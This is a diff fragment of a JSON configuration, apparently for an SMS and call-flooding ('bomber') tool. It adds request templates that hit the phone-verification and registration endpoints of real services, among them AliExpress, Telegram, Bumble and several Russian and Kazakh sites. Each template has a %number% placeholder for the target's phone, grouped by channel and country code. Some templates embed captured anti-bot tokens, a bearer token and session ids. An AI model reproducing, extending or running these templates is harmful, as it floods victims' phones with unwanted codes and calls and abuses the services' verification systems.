"bx-ua":"224!bycI2away6rbxAFidVAOwBgsR8qWFeyeXdBhfYvhQoChIwWGTplgRRhf7nsDADAAWX+CoxfGDPJKRReXgMLNrjp1OQVQZ+Y3MJyruNjlBpsv5Q3aisVOyvmTAaOfGf526MqoBVpdDDBCgOjGhHbO+f87C5IUrwwzfrZmdV88NYC9MwBBZGkld4JYKDewGX6wpHo0HNsOOpkIspJg7hyhKMFglBDt5EwpLuZD8nKWE4xPpbW4YcCLDhsPLsWKm0LP9o3ZpPaukodiWPqNqjllviwHQ+W+JmI+PiGl5Q1+5k52CDtS5SlxVc7Xsb4zB/OSH/AD34MSUaM+urS4KEhKtoe7hQ+gKHGdUGAbeZ8ZcXxobw71JNzqVMWweWMSN85b5K3Y950Mk9af7wjXHNdUsxtXedMNkHoWgtAGHl6Eg9t6owkOPSfSnYaxbw3wpv62kaAbeZ8ScXYVxbVGeGwZ/6bxbwe+c1NS6NbjuZBZpNoox22BW/fF8wAxc8a1vTS+kVbb3aVPaWdQbvSJ4PWtwuIlkfBqCGiEyBEPvpAYs7fMA/gsFSynPEwc7HH7jzGh2OTK4wrj1f64y78a/N+Jzdp+CJWc2sI40a0j5ni3mEjZ5qev9PjXxbuvIQQsQgZcflI2GjJEyBVuBT/YnP/x1+IhSDt801iRIiYiTxT8yjp/y8VCrIPy+DBEM4y9Y4mRsFYbv39MVV7iIFHM2LArOFo/YsKxxdstigJKCV47qNbtMGlJKgYww4v8ziPesT0r7DSmKupimAVTiy7Zs239umR0GndSQFAFjWPfoKgsnRo8X8BFpSJkKjnL64SBxyTGOE8QuniocNl3sslawiDBt5cv4lUWVtPudnQmJ3YyKA7UsUx1U0YbeQdRyt4KL8tpwrBJgOrhf3REOEMjjID7gZyFhxwXe8mHFQ4tO+MzF6xxqbeAzJXZszDTDAEJV6zHgnH1/lWAnxTCU1sok3SHUMaFmgiaqWNljluDObOaYSkS01hrwiEBjPyPqcOoDfh5LRCOKqWK6iP6p+MA8Ug/kebF4nQinCOn7XgG14RGTBO32ZpVxHfBGsROfMPeEw/EoQVqYcx7qKLQE8qPFS6DSCzAA6Ep16/3a1TNGh5MJGhaD60HpHlCMgtiyV91qfI3DrBoBKuyq4I7DlbVvulh3nveOjomguoe+5+BG1xjwDnpdnciJdf19xWE4JYmRmPNl4bC9Y5junvn1iG=","bx-umidtoken":"T2gAnSyGm7Lnm7kCGCA8MkBECNDlyMhah60C-CcVUp1o2_btJJEF20Tt4wxYgSlNlMA=","X-Aer-Cna":"Z9MdHF6vpSoCAZJGekKmoDTw","bx-v":"2.2.3","Content-Type":"text/plain;charset=UTF-8"}],
+             "data": {"phone":"%number%","locale":"ru_RU","currency":"RUB","returnURL":"https://m.aliexpress.ru/account.html?spm=a2g2x.detail.AccountTab.1.575e1f11syoX0h","channel":"CALL","environment":{"uaEncrpt":"224!bycI2away6rbxAFidVAOwBgsR8qWFeyeXdBhfYvhQoChIwWGTplgRRhf7nsDADAAWX+CoxfGDPJKRReXgMLNrjp1OQVQZ+Y3MJyruNjlBpsv5Q3aisVOyvmTAaOfGf526MqoBVpdDDBCgOjGhHbO+f87C5IUrwwzfrZmdV88NYC9MwBBZGkld4JYKDewGX6wpHo0HNsOOpkIspJg7hyhKMFglBDt5EwpLuZD8nKWE4xPpbW4YcCLDhsPLsWKm0LP9o3ZpPaukodiWPqNqjllviwHQ+W+JmI+PiGl5Q1+5k52CDtS5SlxVc7Xsb4zB/OSH/AD34MSUaM+urS4KEhKtoe7hQ+gKHGdUGAbeZ8ZcXxobw71JNzqVMWweWMSN85b5K3Y950Mk9af7wjXHNdUsxtXedMNkHoWgtAGHl6Eg9t6owkOPSfSnYaxbw3wpv62kaAbeZ8ScXYVxbVGeGwZ/6bxbwe+c1NS6NbjuZBZpNoox22BW/fF8wAxc8a1vTS+kVbb3aVPaWdQbvSJ4PWtwuIlkfBqCGiEyBEPvpAYs7fMA/gsFSynPEwc7HH7jzGh2OTK4wrj1f64y78a/N+Jzdp+CJWc2sI40a0j5ni3mEjZ5qev9PjXxbuvIQQsQgZcflI2GjJEyBVuBT/YnP/x1+IhSDt801iRIiYiTxT8yjp/y8VCrIPy+DBEM4y9Y4mRsFYbv39MVV7iIFHM2LArOFo/YsKxxdstigJKCV47qNbtMGlJKgYww4v8ziPesT0r7DSmKupimAVTiy7Zs239umR0GndSQFAFjWPfoKgsnRo8X8BFpSJkKjnL64SBxyTGOE8QuniocNl3sslawiDBt5cv4lUWVtPudnQmJ3YyKA7UsUx1U0YbeQdRyt4KL8tpwrBJgOrhf3REOEMjjID7gZyFhxwXe8mHFQ4tO+MzF6xxqbeAzJXZszDTDAEJV6zHgnH1/lWAnxTCU1sok3SHUMaFmgiaqWNljluDObOaYSkS01hrwiEBjPyPqcOoDfh5LRCOKqWK6iP6p+MA8Ug/kebF4nQinCOn7XgG14RGTBO32ZpVxHfBGsROfMPeEw/EoQVqYcx7qKLQE8qPFS6DSCzAA6Ep16/3a1TNGh5MJGhaD60HpHlCMgtiyV91qfI3DrBoBKuyq4I7DlbVvulh3nveOjomguoe+5+BG1xjwDnpdnciJdf19xWE4JYmRmPNl4bC9Y5junvn1iG=","umidToken":"T2gAnSyGm7Lnm7kCGCA8MkBECNDlyMhah60C-CcVUp1o2_btJJEF20Tt4wxYgSlNlMA=","regSrc":"AE_MAIN_LOGIN","securityTimestamp":1670833521417,"refer":"","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}},
+             "method": "post",
+             "ins":"+*-**********"
+             },
+
+         {
+             "url": "https://login.bilimland.kz/api/v1/registration",
+             "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "X-Requested-With":"XMLHttpRequest","Content-Type":"application/json;charset=utf-8"}],
+             "data": {"phone":"%number%"},
+             "method": "post",
+             "ins":"+* (***) ***-**-**"
+             },
+
+         {
+             "url": "https://kino.kz/_next/data/BZ-SZ38M9Fz5hqwFxvq4q/confirm.json?phone=%number%&registration=true&resource=%2Fprofile",
+             "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5"}],
+             "string": "",
+             "method": "get",
+             "ins":"***********"
+             },
+
+         {
+             "url": "https://kino.kz/_next/data/BZ-SZ38M9Fz5hqwFxvq4q/confirm.json?phone=%number%&registration=true&resource=%2Fprofile",
+             "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5"}],
+             "string": "",
+             "method": "get",
+             "ins":"***********"
+             },
+
+         {
+             "url": "https://api.platform.aviataproject.com/auth/api/v1/users/logon",
+             "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "ru","Content-Type":"application/json","Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJiNDIzZjBlYi04NjA0LTRhMzgtYmE4Zi0wNDllNzIxMDg5MjYiLCJpc3MiOiIwMmRlNDcyNWU1YTU0YzJiOTJjYjMxNTZiZmE0MTQ1NyIsImlhdCI6MTY3MTA0ODc1MSwiZXhwIjoyOTk1NTYwNzUxLCJjb25zdW1lciI6eyJpZCI6Ik5vbmUiLCJuYW1lIjoiYXZpYXRhLWt6LndlYi5kZXNrdG9wIn19.avyNw1O8au9qqrnibecRgKzm5Tt_V82YCjNxRKH2Fyw"}],
+             "json": {"phone":"%number%"},
+             "method": "post",
+             "ins":"***********"
+             },
+
+         {
+             "url": "https://m.tabor.ru/activate.php",
+             "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+             "data": "phone=%number%&submit=%D0%9F%D0%BE%D0%B4%D1%82%D0%B2%D0%B5%D1%80%D0%B4%D0%B8%D1%82%D1%8C+%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B0%D1%86%D0%B8%D1%8E",
+             "method": "post",
+             "ins":"#**********"
+             },
+
+         {
+             "url": "https://zhivika.ru/auth/sms",
+             "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token":"9flZnF8MCrGM3mZGa3rdOWpICnZAOB1LTjZ0mjYf","X-Requested-With":"XMLHttpRequest"}],
+             "data": "phone=%number%",
+             "method": "post",
+             "ins":"+* (***) ***-**-**"
+             },
+
+         {
+             "url": "https://cp.1pay.uz/ru/site/register",
+             "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+             "data": "recaptchaResponse=null&iamlegal=0&tel=%number%&password=%password%&terms=true",
+             "method": "post",
+             "ins":"+**********"
+             },
+           {
                    "url": "https://fresaflowers.ru/bitrix/components/bxmaker/authuserphone.login/ajax.php",
                    "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"}],
                    "data": "parameters=YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30%3D.02850d98d8df4302191e3dcb1c4f0e54aa3a44ae260fac3c0456807cf8eb12ef&template=.default.c803f4f501f4dc413e7cf58c4aa120323a3c8dd347956de6e729fc8bc2b20ad0&siteId=s1&sessid=22c2e71617443f5fad9618c11b59b208&method=sendCode&phone=%number%&registration=Y",
@@ -1753,9 +2547,7 @@
                      "json": {"phone":"%number%"},
                      "method": "post",
                      "ins": "+*(***)-***-**-**"
-                   }
-
-                 ],
+                   }],
 
          "calls": [{
                         "url": "https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/bryansk/auth/request_code/",
@@ -1928,6 +2720,69 @@
                 ],
 
           "sms":[{
+              "url": "https://login.aliexpress.ru/aer-api/v2/bx/auth/v1/web/register/phone/init?_bx-v=2.2.3",
+              "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5", "bx-ua":"224!bycI2away6rbxAFidVAOwBgsR8qWFeyeXdBhfYvhQoChIwWGTplgRRhf7nsDADAAWX+CoxfGDPJKRReXgMLNrjp1OQVQZ+Y3MJyruNjlBpsv5Q3aisVOyvmTAaOfGf526MqoBVpdDDBCgOjGhHbO+f87C5IUrwwzfrZmdV88NYC9MwBBZGkld4JYKDewGX6wpHo0HNsOOpkIspJg7hyhKMFglBDt5EwpLuZD8nKWE4xPpbW4YcCLDhsPLsWKm0LP9o3ZpPaukodiWPqNqjllviwHQ+W+JmI+PiGl5Q1+5k52CDtS5SlxVc7Xsb4zB/OSH/AD34MSUaM+urS4KEhKtoe7hQ+gKHGdUGAbeZ8ZcXxobw71JNzqVMWweWMSN85b5K3Y950Mk9af7wjXHNdUsxtXedMNkHoWgtAGHl6Eg9t6owkOPSfSnYaxbw3wpv62kaAbeZ8ScXYVxbVGeGwZ/6bxbwe+c1NS6NbjuZBZpNoox22BW/fF8wAxc8a1vTS+kVbb3aVPaWdQbvSJ4PWtwuIlkfBqCGiEyBEPvpAYs7fMA/gsFSynPEwc7HH7jzGh2OTK4wrj1f64y78a/N+Jzdp+CJWc2sI40a0j5ni3mEjZ5qev9PjXxbuvIQQsQgZcflI2GjJEyBVuBT/YnP/x1+IhSDt801iRIiYiTxT8yjp/y8VCrIPy+DBEM4y9Y4mRsFYbv39MVV7iIFHM2LArOFo/YsKxxdstigJKCV47qNbtMGlJKgYww4v8ziPesT0r7DSmKupimAVTiy7Zs239umR0GndSQFAFjWPfoKgsnRo8X8BFpSJkKjnL64SBxyTGOE8QuniocNl3sslawiDBt5cv4lUWVtPudnQmJ3YyKA7UsUx1U0YbeQdRyt4KL8tpwrBJgOrhf3REOEMjjID7gZyFhxwXe8mHFQ4tO+MzF6xxqbeAzJXZszDTDAEJV6zHgnH1/lWAnxTCU1sok3SHUMaFmgiaqWNljluDObOaYSkS01hrwiEBjPyPqcOoDfh5LRCOKqWK6iP6p+MA8Ug/kebF4nQinCOn7XgG14RGTBO32ZpVxHfBGsROfMPeEw/EoQVqYcx7qKLQE8qPFS6DSCzAA6Ep16/3a1TNGh5MJGhaD60HpHlCMgtiyV91qfI3DrBoBKuyq4I7DlbVvulh3nveOjomguoe+5+BG1xjwDnpdnciJdf19xWE4JYmRmPNl4bC9Y5junvn1iG=","bx-umidtoken":"T2gAnSyGm7Lnm7kCGCA8MkBECNDlyMhah60C-CcVUp1o2_btJJEF20Tt4wxYgSlNlMA=","X-Aer-Cna":"Z9MdHF6vpSoCAZJGekKmoDTw","bx-v":"2.2.3","Content-Type":"text/plain;charset=UTF-8"}],
+              "data": {"phone":"%number%","locale":"ru_RU","currency":"RUB","returnURL":"https://m.aliexpress.ru/account.html?spm=a2g2x.detail.AccountTab.1.575e1f11syoX0h","channel":"CALL","environment":{"uaEncrpt":"224!bycI2away6rbxAFidVAOwBgsR8qWFeyeXdBhfYvhQoChIwWGTplgRRhf7nsDADAAWX+CoxfGDPJKRReXgMLNrjp1OQVQZ+Y3MJyruNjlBpsv5Q3aisVOyvmTAaOfGf526MqoBVpdDDBCgOjGhHbO+f87C5IUrwwzfrZmdV88NYC9MwBBZGkld4JYKDewGX6wpHo0HNsOOpkIspJg7hyhKMFglBDt5EwpLuZD8nKWE4xPpbW4YcCLDhsPLsWKm0LP9o3ZpPaukodiWPqNqjllviwHQ+W+JmI+PiGl5Q1+5k52CDtS5SlxVc7Xsb4zB/OSH/AD34MSUaM+urS4KEhKtoe7hQ+gKHGdUGAbeZ8ZcXxobw71JNzqVMWweWMSN85b5K3Y950Mk9af7wjXHNdUsxtXedMNkHoWgtAGHl6Eg9t6owkOPSfSnYaxbw3wpv62kaAbeZ8ScXYVxbVGeGwZ/6bxbwe+c1NS6NbjuZBZpNoox22BW/fF8wAxc8a1vTS+kVbb3aVPaWdQbvSJ4PWtwuIlkfBqCGiEyBEPvpAYs7fMA/gsFSynPEwc7HH7jzGh2OTK4wrj1f64y78a/N+Jzdp+CJWc2sI40a0j5ni3mEjZ5qev9PjXxbuvIQQsQgZcflI2GjJEyBVuBT/YnP/x1+IhSDt801iRIiYiTxT8yjp/y8VCrIPy+DBEM4y9Y4mRsFYbv39MVV7iIFHM2LArOFo/YsKxxdstigJKCV47qNbtMGlJKgYww4v8ziPesT0r7DSmKupimAVTiy7Zs239umR0GndSQFAFjWPfoKgsnRo8X8BFpSJkKjnL64SBxyTGOE8QuniocNl3sslawiDBt5cv4lUWVtPudnQmJ3YyKA7UsUx1U0YbeQdRyt4KL8tpwrBJgOrhf3REOEMjjID7gZyFhxwXe8mHFQ4tO+MzF6xxqbeAzJXZszDTDAEJV6zHgnH1/lWAnxTCU1sok3SHUMaFmgiaqWNljluDObOaYSkS01hrwiEBjPyPqcOoDfh5LRCOKqWK6iP6p+MA8Ug/kebF4nQinCOn7XgG14RGTBO32ZpVxHfBGsROfMPeEw/EoQVqYcx7qKLQE8qPFS6DSCzAA6Ep16/3a1TNGh5MJGhaD60HpHlCMgtiyV91qfI3DrBoBKuyq4I7DlbVvulh3nveOjomguoe+5+BG1xjwDnpdnciJdf19xWE4JYmRmPNl4bC9Y5junvn1iG=","umidToken":"T2gAnSyGm7Lnm7kCGCA8MkBECNDlyMhah60C-CcVUp1o2_btJJEF20Tt4wxYgSlNlMA=","regSrc":"AE_MAIN_LOGIN","securityTimestamp":1670833521417,"refer":"","userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}},
+              "method": "post",
+              "ins":"+*-**********"
+              },
+
+          {
+              "url": "https://login.bilimland.kz/api/v1/registration",
+              "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "X-Requested-With":"XMLHttpRequest","Content-Type":"application/json;charset=utf-8"}],
+              "data": {"phone":"%number%"},
+              "method": "post",
+              "ins":"+* (***) ***-**-**"
+              },
+
+          {
+              "url": "https://kino.kz/_next/data/BZ-SZ38M9Fz5hqwFxvq4q/confirm.json?phone=%number%&registration=true&resource=%2Fprofile",
+              "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5"}],
+              "string": "",
+              "method": "get",
+              "ins":"***********"
+              },
+
+          {
+              "url": "https://kino.kz/_next/data/BZ-SZ38M9Fz5hqwFxvq4q/confirm.json?phone=%number%&registration=true&resource=%2Fprofile",
+              "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5"}],
+              "string": "",
+              "method": "get",
+              "ins":"***********"
+              },
+
+          {
+              "url": "https://api.platform.aviataproject.com/auth/api/v1/users/logon",
+              "headers": [{"User-Agent": " ", "Accept":"application/json, text/plain, */*", "Accept-Language": "ru","Content-Type":"application/json","Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJiNDIzZjBlYi04NjA0LTRhMzgtYmE4Zi0wNDllNzIxMDg5MjYiLCJpc3MiOiIwMmRlNDcyNWU1YTU0YzJiOTJjYjMxNTZiZmE0MTQ1NyIsImlhdCI6MTY3MTA0ODc1MSwiZXhwIjoyOTk1NTYwNzUxLCJjb25zdW1lciI6eyJpZCI6Ik5vbmUiLCJuYW1lIjoiYXZpYXRhLWt6LndlYi5kZXNrdG9wIn19.avyNw1O8au9qqrnibecRgKzm5Tt_V82YCjNxRKH2Fyw"}],
+              "json": {"phone":"%number%"},
+              "method": "post",
+              "ins":"***********"
+              },
+
+          {
+              "url": "https://m.tabor.ru/activate.php",
+              "headers": [{"User-Agent": " ", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+              "data": "phone=%number%&submit=%D0%9F%D0%BE%D0%B4%D1%82%D0%B2%D0%B5%D1%80%D0%B4%D0%B8%D1%82%D1%8C+%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B0%D1%86%D0%B8%D1%8E",
+              "method": "post",
+              "ins":"#**********"
+              },
+
+          {
+              "url": "https://zhivika.ru/auth/sms",
+              "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token":"9flZnF8MCrGM3mZGa3rdOWpICnZAOB1LTjZ0mjYf","X-Requested-With":"XMLHttpRequest"}],
+              "data": "phone=%number%",
+              "method": "post",
+              "ins":"+* (***) ***-**-**"
+              },
+
+          {
+              "url": "https://cp.1pay.uz/ru/site/register",
+              "headers": [{"User-Agent": " ", "Accept":"*/*", "Accept-Language": "en-US,en;q=0.5","Content-Type":"application/x-www-form-urlencoded"}],
+              "data": "recaptchaResponse=null&iamlegal=0&tel=%number%&password=%password%&terms=true",
+              "method": "post",
+              "ins":"+**********"
+              },
+            {
                     "url": "https://fresaflowers.ru/bitrix/components/bxmaker/authuserphone.login/ajax.php",
                     "headers": [{"User-Agent": " ", "Accept":"application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With":"XMLHttpRequest"}],
                     "data": "parameters=YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30%3D.02850d98d8df4302191e3dcb1c4f0e54aa3a44ae260fac3c0456807cf8eb12ef&template=.default.c803f4f501f4dc413e7cf58c4aa120323a3c8dd347956de6e729fc8bc2b20ad0&siteId=s1&sessid=22c2e71617443f5fad9618c11b59b208&method=sendCode&phone=%number%&registration=Y",
@@ -2736,7 +3591,29 @@
       },
 
       "81":{
-        "mix":[],
+        "mix":[{
+                   "url":"https://my.telegram.org/auth/send_password",
+                   "headers":[{"User-Agent":" ",  "DNT":"1"}],
+                   "data":"phone=%number%",
+                   "method":"post",
+                   "ins":"+************"
+                 },
+                 {
+                   "url": "https://bumble.com/mwebapi.phtml?SERVER_VALIDATE_PHONE_NUMBER",
+                   "headers":[{"User-Agent": " ", "Accept": "*/*", "Content-Type":"application/json", "X-Pingback": "0", "X-Message-type":"640", "x-use-session-cookie":"0"}],
+                   "json":{"$gpb":"badoo.bma.BadooMessage","body":[{"message_type":640,"server_validate_phone_number":{"phone_prefix":"+81","phone":"%number%","context":203}}],"message_id":12,"message_type":640,"version":1,"is_background":false},
+                   "method":"post",
+                   "ins": "##*********"
+                 },
+
+                 {
+                   "url":"https://skorozvon.ru/main",
+                   "headers":[{"User-Agent": " "}],
+                   "params":{"phone":"%number%"},
+                   "method":"get",
+                   "ins":"***********"
+
+                 }],
 
         "calls":[],
 
